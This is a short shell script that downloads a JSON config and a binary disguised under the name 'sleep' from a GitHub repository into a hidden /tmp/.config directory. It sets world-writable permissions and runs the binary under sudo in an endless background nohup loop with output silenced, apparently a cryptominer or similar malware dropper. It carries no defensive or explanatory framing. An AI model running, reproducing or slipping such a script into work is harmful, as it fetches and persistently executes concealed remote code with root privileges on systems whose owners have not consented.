#!/bin/sh

mkdir -p /tmp/.config
wget -qO /tmp/.config/.json https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/x14.json
wget -qO /tmp/.config/sleep https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/sleep
chmod -R 777 /tmp/.config
/bin/sh -c "while true; do nohup sudo /tmp/.config/sleep --config=/tmp/.config/.json >/dev/null; done" &

# 



